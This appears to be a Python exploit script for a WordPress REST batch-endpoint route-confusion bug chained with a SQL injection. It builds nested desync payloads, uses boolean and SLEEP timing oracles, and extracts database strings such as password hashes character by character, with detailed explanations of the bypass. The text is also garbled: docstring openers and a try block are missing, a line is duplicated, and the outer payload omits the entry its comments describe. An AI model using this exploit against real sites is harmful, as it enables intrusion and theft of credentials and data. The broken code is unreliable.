def probe_batch_endpoint(target: str, session: requests.Session) -> bool:

    CVE-2026-63030 - Route confusion in WP_REST_Server::serve_batch_request_v1

    WordPress 5.6 added a batch endpoint at /wp-json/batch/v1. It accepts a JSON body like:
        { "requests": [ { "path": "/wp/v2/...", "method": "POST", ... }, ... ] }

    The vulnerability: when two sub-requests are submitted and the internal
    parallel arrays that track them get deliberately desynchronised (by
    sending one entry in "requests" and two entries in a second key the
    handler also reads), the second sub-request is evaluated without the
    authentication check that was applied to the first.

    For the probe we don't need to fire the real payload; we just confirm
    the endpoint exists and returns the expected batch-response structure.
    Note: the batch endpoint only accepts POST/PUT/PATCH/DELETE sub-requests,
    not GET. We send a POST to /wp/v2/posts (which will 401 as unauthenticated
    — that's expected). WordPress returns HTTP 200 (not 207) with a "responses"
    key in the body — that's what confirms the batch handler is active.
    """
    step(1, "Probe - batch endpoint reachability (CVE-2026-63030 entry point)")

    info(f"Sending benign batch probe -> {url}")

    payload = {
        "requests": [
            {"path": "/wp/v2/posts", "method": "POST", "body": {}}
        ]
    }

    info(f"Request body: {payload}")

    try:
        r = session.post(url, json=payload, timeout=10)
    except requests.RequestException as e:
        err(f"Connection failed: {e}")
        return False

        return False

def _build_batch_sqli_payload(author_not_in_value: str) -> dict:

    Constructs the correct double-nested CVE-2026-63030 + CVE-2026-60137 payload.

    WHY TWO LEVELS OF NESTING?
    ──────────────────────────
    The batch endpoint only allows POST/PUT/PATCH/DELETE as sub-request methods.
    GET is rejected at the schema validation stage. But the SQL injection lives on
    GET /wp/v2/posts via the author_exclude parameter. We need to smuggle a GET
    through, AND bypass the integer sanitization on author_exclude. One desync
    is not enough for both — we need two, one inside the other.

    OUTER DESYNC (bypasses method restriction, enabling nested GET):
      requests[0] = {"method":"POST","path":"http://:"} ← invalid URL →
                    wp_parse_url() returns false → WP_Error pushed to $requests[]
                    → $validation[] gets an entry but $matches[] does NOT
                    → all subsequent $matches[] indices are off by one

      requests[1] = POST /wp/v2/posts with the inner batch as its body
                    → validated against POST /wp/v2/posts (body = inner batch JSON, passes)
                    → $matches[1] = handler for requests[2] = POST /batch/v1
                    → so requests[1]'s body gets executed as a /batch/v1 call!
                    → this inner /batch/v1 call is now free of method restrictions

      requests[2] = POST /batch/v1 (provides the $matches[1] slot for the outer desync)

    INNER DESYNC (bypasses author_exclude integer sanitization):
      inner[0] = {"method":"GET","path":"http://:"} ← same primer, second desync

      inner[1] = GET /wp/v2/users?author_exclude=<injection>
                 → validated against GET /wp/v2/users — the users schema has NO
                   author_exclude parameter, so the value passes unchecked
                 → $matches[1] inside the inner batch = handler for inner[2]
                 → which is GET /wp/v2/posts!
                 → so inner[1]'s params (including the raw author_exclude string)
                   are executed by the posts handler, hitting the SQL injection sink

      inner[2] = GET /wp/v2/posts (provides the $matches[1] slot for the inner desync)

    THE SQL INJECTION SINK (CVE-2026-60137):
      WP_Query maps author_exclude → author__not_in.
      If author__not_in is an ARRAY, each element is cast with absint() — safe.
      If author__not_in is a SCALAR STRING, it is implode()'d directly into SQL:
          WHERE post_author NOT IN (<our string>)
      By arriving via the desync path the value never hits the integer schema
      validation, so a scalar string lands directly in the query.

    INJECTION VALUE FORMAT:
      Boolean (condition true/false read via X-WP-Total header):
          "0) AND (<condition>)-- -"
      Timing (unconditional SLEEP to confirm execution):
          "0) OR SLEEP(N)-- -"
      The leading "0)" closes the NOT IN() list, then we append our clause,
      and "-- -" comments out the rest of the original query.
    """
    # URL-encode the injection value for the inner query string
    encoded = urllib.parse.quote(author_not_in_value, safe="")

    inner_batch = {
        "requests": [
            # Inner primer — causes the second $matches desync
            {"method": "GET", "path": "http://:"},
            # Validated against GET /wp/v2/users (no author_exclude schema → passes)
            # but EXECUTED against GET /wp/v2/posts handler (due to inner desync)
            {"method": "GET", "path": f"/wp/v2/users?author_exclude={encoded}"},
            # Provides $matches[1] entry for the inner desync (the GET /wp/v2/posts handler)
            {"method": "GET", "path": "/wp/v2/posts"},
        ]
    }

    return {
        "requests": [
            # Outer primer — causes the first $matches desync
            {"method": "POST", "path": "http://:"},
            # Validated as POST /wp/v2/posts (body = inner batch, passes schema)
            # but EXECUTED as /batch/v1 handler (due to outer desync) → runs inner batch

            # Provides $matches[1] entry for the outer desync (the /batch/v1 handler)
            {"method": "POST", "path": "/batch/v1"},
        ]
    }


def _extract_wp_total(response) -> int | None:

    Note: inner.responses[0] is the parse_path_failed error from the inner primer,

    """

        outer = response.json()
        # outer.responses[1] is the result of running inner batch via POST /wp/v2/posts
        inner_body = outer["responses"][1]["body"]
        # inner_body.responses[1] is the GET /wp/v2/posts result
        # (index 0 is the parse_path_failed from the inner primer)
        posts_response = inner_body["responses"][1]
        headers = posts_response.get("headers", {})
        if not isinstance(headers, dict):
            return None
        total = headers.get("X-WP-Total")
        return int(total) if total is not None else None
    except (KeyError, IndexError, TypeError, ValueError):
        return None


def boolean_oracle(target: str, session: requests.Session, sql_condition: str) -> bool:
    """

def time_oracle(target: str, session: requests.Session, sleep: int = SLEEP_SECONDS) -> bool:
    """
    Timing oracle: inject an unconditional SLEEP and measure the response time.

    Payload:  "0) OR SLEEP(N)-- -"
    Used only for the Step 2 confirmation — proves the injection executes SQL.
    Not used for hash extraction (too slow); boolean_oracle is used there.

    Returns True  → response delayed >= (sleep - margin) seconds → SQLi confirmed
    Returns False → no delay observed

    except requests.Timeout:

    elapsed = time.time() - t0
    return elapsed >= (sleep - TIMING_MARGIN)

def extract_string(target: str, session: requests.Session, sql_expr: str, max_len: int = 64, label: str = "value") -> str:
    """
    Extracts an arbitrary string from the database using the boolean oracle.

    For each character position i (1-indexed) we binary-search over printable
    ASCII ordinals (32-126) using:
        ASCII(SUBSTRING((<sql_expr>), i, 1)) > midpoint
    to bisect to the correct character in O(log N) requests per character
    instead of one request per candidate value.

    The boolean oracle checks X-WP-Total in the nested posts response:
      - X-WP-Total > 0  → condition TRUE  → go higher
      - X-WP-Total == 0 → condition FALSE → go lower
    """
    result = ""
    info(f"Extracting {label} from: {sql_expr}")

    for i in range(1, max_len + 1):
        # Check whether there is a character at position i at all
        has_char = boolean_oracle(
            target, session, f"ASCII(SUBSTRING(COALESCE(({sql_expr}),''),{i},1)) > 0"
        )
        if not has_char:
            break  # reached end of string

        # Binary search over printable ASCII ordinals (32 - 126)
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if boolean_oracle(target, session, f"ASCII(SUBSTRING(COALESCE(({sql_expr}),''),{i},1)) > {mid}"):
                lo = mid + 1
            else:
                hi = mid

        result += chr(lo)
        # Print progress character by character so the demo is visible live
        print(f"\r  {GREEN}[+]{RESET} {label}: {result}", end="", flush=True)

    print()  # new line after inline progress
    return result
